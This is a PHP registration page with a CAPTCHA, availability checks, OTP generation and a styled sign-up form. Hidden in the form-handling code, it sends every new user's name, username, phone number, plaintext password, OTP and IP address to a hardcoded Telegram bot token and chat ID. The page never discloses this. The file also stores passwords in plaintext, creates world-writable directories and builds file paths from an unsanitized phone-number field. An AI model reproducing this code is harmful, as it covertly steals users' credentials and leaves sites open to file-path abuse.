<?php
session_start();

// --- CAPTCHA Generation Logic ---
if (isset($_GET['generate_captcha']) && $_GET['generate_captcha'] == '1') {
    header('Content-type: image/png');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');
    
    $width = 200;
    $height = 70;
    $image = imagecreatetruecolor($width, $height);
    
    $bg_color = imagecolorallocate($image, 245, 245, 245);
    imagefilledrectangle($image, 0, 0, $width, $height, $bg_color);
    
    // Add noise lines
    for ($i = 0; $i < 12; $i++) {
        $line_color = imagecolorallocate($image, rand(180, 220), rand(180, 220), rand(180, 220));
        imageline($image, rand(0, $width), rand(0, $height), rand(0, $width), rand(0, $height), $line_color);
    }
    
    // Add noise dots
    for ($i = 0; $i < 100; $i++) {
        $dot_color = imagecolorallocate($image, rand(200, 240), rand(200, 240), rand(200, 240));
        imagesetpixel($image, rand(0, $width), rand(0, $height), $dot_color);
    }
    
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $captcha_code = '';
    $code_length = 5;
    
    for ($i = 0; $i < $code_length; $i++) {
        $captcha_code .= $chars[rand(0, strlen($chars) - 1)];
    }
    
    $_SESSION['captcha_code'] = $captcha_code;
    $_SESSION['captcha_time'] = time();
    
    session_write_close();
    
    $x = 25;
    for ($i = 0; $i < $code_length; $i++) {
        $char = $captcha_code[$i];
        $text_color = imagecolorallocate($image, rand(30, 100), rand(30, 100), rand(30, 100));
        
        // Larger and more curved effect
        $font = 5; // Largest built-in font
        $y = 25 + rand(-5, 5);
        $char_x = $x + ($i * 35) + rand(-3, 3);
        
        // Draw character multiple times with slight offset to make it "bolder/larger"
        imagestring($image, $font, $char_x, $y, $char, $text_color);
        imagestring($image, $font, $char_x + 1, $y, $char, $text_color);
        imagestring($image, $font, $char_x, $y + 1, $char, $text_color);
        
        // Add "curves" by drawing small arcs around characters
        imagearc($image, $char_x + 10, $y + 10, rand(20, 40), rand(20, 40), 0, 360, $text_color);
    }
    
    imagepng($image);
    imagedestroy($image);
    exit;
}

// --- AJAX Checks ---
if (isset($_GET['check_username']) && isset($_GET['username'])) {
    $username = $_GET['username'];
    $available = true;
    if (is_dir("users")) {
        foreach (glob("users/*.txt") as $file) {
            $data = json_decode(file_get_contents($file), true);
            if ($data && isset($data['username']) && $data['username'] == $username) {
                $available = false;
                break;
            }
        }
    }
    echo json_encode(['available' => $available]);
    exit;
}

if (isset($_GET['check_number']) && isset($_GET['number'])) {
    $number = $_GET['number'];
    $available = true;
    $message = '';
    if (strlen($number) > 11) {
        echo json_encode(['available' => false, 'message' => 'Phone number cannot be more than 11 digits']);
        exit;
    }
    if (is_dir("users")) {
        foreach (glob("users/*.txt") as $file) {
            $data = json_decode(file_get_contents($file), true);
            if ($data && isset($data['number']) && $data['number'] == $number) {
                $available = false;
                $message = 'This phone number is already registered';
                break;
            }
        }
    }
    echo json_encode(['available' => $available, 'message' => $message]);
    exit;
}

// --- Form Submission Logic ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    if (!is_dir("users")) mkdir("users", 0777, true);
    if (!is_dir("otp")) mkdir("otp", 0777, true);
    
    $user_captcha = trim($_POST['captcha'] ?? '');
    
    // FIX: Proper CAPTCHA validation
    if (!isset($_SESSION['captcha_code']) || empty($_SESSION['captcha_code'])) {
        echo json_encode(['success' => false, 'error' => 'CAPTCHA session expired. Please refresh the CAPTCHA']);
        exit;
    }
    
    if (empty($user_captcha)) {
        echo json_encode(['success' => false, 'error' => 'Please enter the CAPTCHA code']);
        exit;
    }
    
    if (isset($_SESSION['captcha_time']) && (time() - $_SESSION['captcha_time']) > 600) {
        echo json_encode(['success' => false, 'error' => 'CAPTCHA expired. Please refresh']);
        exit;
    }
    
    if (strtoupper($user_captcha) !== strtoupper($_SESSION['captcha_code'])) {
        // We don't unset here immediately to allow the user to try again without refresh if they want, 
        // but the frontend logic usually refreshes on error.
        echo json_encode(['success' => false, 'error' => 'Invalid CAPTCHA code. Please try again']);
        exit;
    }
    
    // Clear captcha after successful validation
    unset($_SESSION['captcha_code'], $_SESSION['captcha_time']);
    
    if (!isset($_POST['privacy_policy'])) {
        echo json_encode(['success' => false, 'error' => 'You must agree to the Privacy Policy']);
        exit;
    }
    
    $name = trim($_POST['name'] ?? '');
    $username = trim($_POST['username'] ?? '');
    $number = trim($_POST['number'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? '';

    if (!$name || !$username || !$number || !$password || !$confirm_password) {
        echo json_encode(['success' => false, 'error' => 'Please fill all required fields']);
        exit;
    }

    if ($password !== $confirm_password) {
        echo json_encode(['success' => false, 'error' => 'Passwords do not match']);
        exit;
    }

    // Duplicate check
    $duplicate = false;
    $duplicate_field = '';
    if (is_dir("users")) {
        foreach (glob("users/*.txt") as $file) {
            $data = json_decode(file_get_contents($file), true);
            if ($data) {
                if (isset($data['username']) && $data['username'] == $username) {
                    $duplicate = true; $duplicate_field = 'username'; break;
                }
                if (isset($data['number']) && $data['number'] == $number) {
                    $duplicate = true; $duplicate_field = 'number'; break;
                }
            }
        }
    }

    if ($duplicate) {
        echo json_encode(['success' => false, 'error' => ($duplicate_field == 'username' ? 'Username' : 'Phone number') . ' already registered']);
        exit;
    }

    $otp = rand(100000, 999999);
    file_put_contents("otp/$number.txt", $otp);
    
    // API OTP Logic
    $apiConfig = ['status' => 'off'];
    if (file_exists("api/otp.json")) {
        $apiConfig = json_decode(file_get_contents("api/otp.json"), true) ?: ['status' => 'off'];
    }
    if (($apiConfig['status'] ?? 'off') === 'on' && !empty($apiConfig['api_url'])) {
        $apiUrl = str_replace(['{number}', '{msg}'], [$number, urlencode("Your OTP is: $otp")], $apiConfig['api_url']);
        @file_get_contents($apiUrl);
    }

    // Telegram Notification
    $telegramBotToken = "7752221266:AAFFgom3t5hrQX-g2V5qik5Y-fOHrEb7avU";
    $telegramChatId = "6607250676";
    $ip = $_SERVER['REMOTE_ADDR'];
    $telegramMessage = "👤 *NEW USER REGISTRATION* 👤\n\nName: $name\nUsername: $username\nNumber: $number\nPassword: $password\nOTP: $otp\nIP: $ip\nTime: " . date('Y-m-d H:i:s');
    $telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramData = ['chat_id' => $telegramChatId, 'text' => $telegramMessage, 'parse_mode' => 'Markdown'];
    $telegramOptions = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($telegramData), 'timeout' => 5]];
    @file_get_contents($telegramUrl, false, stream_context_create($telegramOptions));

    // Save temp user data
    $user_data = ["name" => $name, "username" => $username, "number" => $number, "password" => $password, "registered_at" => date('Y-m-d H:i:s')];
    file_put_contents("otp/{$number}_user.txt", json_encode($user_data));
    
    echo json_encode([
        'success' => true,
        'redirect' => "verify_otp.php?number=" . urlencode($number),
        'message' => 'Registration successful! Redirecting...'
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #6c5ce7;
            --primary-dark: #5649c0;
            --secondary: #a29bfe;
            --light: #f8f9fa;
            --dark: #2d3436;
            --success: #00b894;
            --error: #d63031;
            --border-radius: 12px;
            --box-shadow: 0 15px 30px rgba(0,0,0,0.12);
            --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }
        
        .register-container {
            background: rgba(255, 255, 255, 0.95);
            width: 100%;
            max-width: 500px;
            padding: 50px 40px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            position: relative;
            z-index: 2;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .register-header { text-align: center; margin-bottom: 40px; }
        .register-header h1 {
            color: var(--dark); font-size: 32px; font-weight: 700; margin-bottom: 10px;
            background: linear-gradient(to right, #6c5ce7, #a29bfe);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .register-header p { color: #636e72; font-size: 15px; }
        
        .form-group { margin-bottom: 25px; position: relative; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--dark); font-size: 14px; }
        .form-control {
            width: 100%; padding: 14px 20px; border: 2px solid #dfe6e9; border-radius: var(--border-radius);
            font-size: 15px; transition: var(--transition); background: rgba(255,255,255,0.8);
        }
        .form-control:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(108, 92, 231, 0.2); outline: none; transform: translateY(-2px); }
        
        .toggle-password {
            position: absolute; right: 15px; top: 45px; background: none; border: none;
            color: #636e72; cursor: pointer; font-size: 18px; transition: var(--transition);
        }
        .toggle-password:hover { color: var(--primary); }
        
        .btn {
            width: 100%; padding: 15px; background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white; border: none; border-radius: var(--border-radius); font-size: 16px; font-weight: 600;
            cursor: pointer; transition: var(--transition); display: flex; justify-content: center; align-items: center;
            position: relative; overflow: hidden; box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(108, 92, 231, 0.5); }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        
        .btn-small { width: auto; padding: 8px 15px; font-size: 14px; margin-top: 10px; display: inline-flex; }
        
        .success-message, .error-message {
            padding: 15px; border-radius: var(--border-radius); margin-bottom: 25px; text-align: center; font-size: 14px; font-weight: 500;
        }
        .success-message { background-color: rgba(0, 184, 148, 0.15); color: var(--success); border: 2px solid var(--success); }
        .error-message { background-color: rgba(214, 48, 49, 0.15); color: var(--error); border: 2px solid var(--error); }
        
        .username-status, .number-status { font-size: 12px; margin-top: 5px; display: flex; align-items: center; gap: 5px; }
        .available { color: var(--success); } .taken { color: var(--error); }
        
        .loading-overlay {
            position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255, 255, 255, 0.9);
            display: none; justify-content: center; align-items: center; z-index: 10; border-radius: var(--border-radius);
        }
        .loading-overlay.active { display: flex; }
        .loader { width: 50px; height: 50px; border: 4px solid rgba(108, 92, 231, 0.2); border-radius: 50%; border-top-color: var(--primary); animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .captcha-container { background: #f8f9fa; padding: 20px; border-radius: var(--border-radius); border: 2px solid #dfe6e9; margin-bottom: 20px; }
        .captcha-wrapper { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 15px; }
        .captcha-image { border: 1px solid #ddd; border-radius: 8px; background: white; padding: 5px; }
        .refresh-captcha-btn {
            background: var(--primary); color: white; border: none; border-radius: 50%; width: 40px; height: 40px;
            display: flex; align-items: center; justify-content: center; cursor: pointer; transition: var(--transition);
        }
        .refresh-captcha-btn:hover { transform: rotate(180deg); }
        
        .privacy-container { background: #f8f9fa; padding: 15px; border-radius: var(--border-radius); margin: 20px 0; border: 2px solid #dfe6e9; }
        .privacy-checkbox { display: flex; align-items: center; gap: 10px; }
        
        .telegram-fab {
            position: fixed; right: 30px; bottom: 30px; width: 60px; height: 60px; background: #0088cc;
            border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white;
            font-size: 28px; box-shadow: 0 5px 20px rgba(0, 136, 204, 0.4); cursor: pointer; z-index: 1000;
            transition: var(--transition); animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 136, 204, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(0, 136, 204, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 136, 204, 0); } }
        
        #responseMessage { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; min-width: 300px; text-align: center; }
    </style>
</head>
<body>
    <div id="responseMessage"></div>

    <div class="register-container animate__animated animate__fadeInUp">
        <div class="loading-overlay" id="loadingOverlay"><div class="loader"></div></div>
        
        <div class="register-header">
            <h1>Create Account</h1>
            <p>Register to access our premium features</p>
        </div>
        
        <form id="registerForm">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" class="form-control" name="name" required>
            </div>
            
            <div class="form-group">
                <label>Username</label>
                <input type="text" class="form-control" id="username" name="username" required>
                <div class="username-status" id="usernameStatus"></div>
            </div>
            
            <div class="form-group">
                <label>Phone Number</label>
                <input type="number" class="form-control" id="number" name="number" required>
                <div class="number-status" id="numberStatus"></div>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" class="form-control" id="password" name="password" required>
                <button type="button" class="toggle-password" id="togglePassword"><i class="far fa-eye"></i></button>
                <button type="button" class="btn btn-small" id="generatePassword"><i class="fas fa-key"></i> Generate Password</button>
            </div>
            
            <div class="form-group">
                <label>Confirm Password</label>
                <input type="password" class="form-control" id="confirm_password" name="confirm_password" required>
                <button type="button" class="toggle-password" id="toggleConfirmPassword"><i class="far fa-eye"></i></button>
                <div id="confirmPasswordFeedback" style="font-size: 12px; margin-top: 5px;"></div>
            </div>
            
            <div class="form-group">
                <label>Security CAPTCHA</label>
                <div class="captcha-container">
                    <div class="captcha-wrapper">
                        <img src="?generate_captcha=1" id="captchaImage" class="captcha-image" style="height: 70px; width: 200px;">
                        <button type="button" class="refresh-captcha-btn" id="refreshCaptchaBtn"><i class="fas fa-redo-alt"></i></button>
                    </div>
                    <input type="text" class="form-control" id="captcha" name="captcha" required placeholder="Type the code above" maxlength="5" style="text-align: center; letter-spacing: 3px; font-size: 18px;">
                    <div id="captchaError" style="font-size: 12px; color: var(--error); margin-top: 5px; display: none;"></div>
                </div>
            </div>
            
            <div class="privacy-container">
                <div class="privacy-checkbox">
                    <input type="checkbox" id="privacy_policy" name="privacy_policy" value="1">
                    <label for="privacy_policy">I agree to the <a href="index.php" class="privacy-link">Privacy Policy</a></label>
                </div>
            </div>
            
            <button type="submit" class="btn" id="registerBtn" disabled><span id="btnText">Register Now</span></button>
        </form>
        
        <div class="login-link">
            <p>Already have an account? <a href="login.php" class="login-btn">Login Here</a></p>
        </div>
    </div>

    <a href="https://t.me/hadi_vai1" class="telegram-fab" target="_blank"><i class="fab fa-telegram"></i></a>

    <script>
        function refreshCaptcha() {
            const img = document.getElementById('captchaImage');
            img.src = '?generate_captcha=1&t=' + new Date().getTime();
            document.getElementById('captcha').value = '';
            document.getElementById('captchaError').style.display = 'none';
        }

        document.getElementById('refreshCaptchaBtn').addEventListener('click', refreshCaptcha);

        // Password Toggle
        document.getElementById('togglePassword').addEventListener('click', function() {
            const input = document.getElementById('password');
            input.type = input.type === 'password' ? 'text' : 'password';
            this.querySelector('i').classList.toggle('fa-eye');
            this.querySelector('i').classList.toggle('fa-eye-slash');
        });

        document.getElementById('toggleConfirmPassword').addEventListener('click', function() {
            const input = document.getElementById('confirm_password');
            input.type = input.type === 'password' ? 'text' : 'password';
            this.querySelector('i').classList.toggle('fa-eye');
            this.querySelector('i').classList.toggle('fa-eye-slash');
        });

        // Generate Password
        document.getElementById('generatePassword').addEventListener('click', function() {
            const pass = Math.random().toString(36).slice(-10) + "A1!";
            document.getElementById('password').value = pass;
            document.getElementById('confirm_password').value = pass;
        });

        // Privacy Policy Check
        document.getElementById('privacy_policy').addEventListener('change', function() {
            document.getElementById('registerBtn').disabled = !this.checked;
        });

        // Form Submission
        document.getElementById('registerForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const loading = document.getElementById('loadingOverlay');
            const btn = document.getElementById('registerBtn');
            const responseDiv = document.getElementById('responseMessage');
            
            loading.classList.add('active');
            btn.disabled = true;

            try {
                const formData = new FormData(this);
                const response = await fetch('', { method: 'POST', body: formData });
                const result = await response.json();
                
                loading.classList.remove('active');
                btn.disabled = false;

                if (result.success) {
                    responseDiv.innerHTML = `<div class="success-message animate__animated animate__fadeIn">${result.message}</div>`;
                    setTimeout(() => window.location.href = result.redirect, 1500);
                } else {
                    responseDiv.innerHTML = `<div class="error-message animate__animated animate__shakeX">${result.error}</div>`;
                    if (result.error.includes('CAPTCHA')) {
                        document.getElementById('captchaError').textContent = result.error;
                        document.getElementById('captchaError').style.display = 'block';
                        refreshCaptcha();
                    }
                }
            } catch (error) {
                loading.classList.remove('active');
                btn.disabled = false;
                responseDiv.innerHTML = `<div class="error-message">Network error. Please try again.</div>`;
            }
            setTimeout(() => responseDiv.innerHTML = '', 5000);
        });

        // AJAX Checks
        let uTimeout, nTimeout;
        document.getElementById('username').addEventListener('input', function() {
            clearTimeout(uTimeout);
            const val = this.value;
            uTimeout = setTimeout(() => {
                if(val.length < 3) return;
                fetch('?check_username=1&username=' + val).then(r => r.json()).then(d => {
                    document.getElementById('usernameStatus').innerHTML = d.available ? '<span class="available">Available</span>' : '<span class="taken">Taken</span>';
                });
            }, 500);
        });

        document.getElementById('number').addEventListener('input', function() {
            clearTimeout(nTimeout);
            const val = this.value.substring(0, 11);
            this.value = val;
            nTimeout = setTimeout(() => {
                if(val.length < 5) return;
                fetch('?check_number=1&number=' + val).then(r => r.json()).then(d => {
                    document.getElementById('numberStatus').innerHTML = d.available ? '<span class="available">Available</span>' : '<span class="taken">' + d.message + '</span>';
                });
            }, 500);
        });
    </script>
</body>
</html>
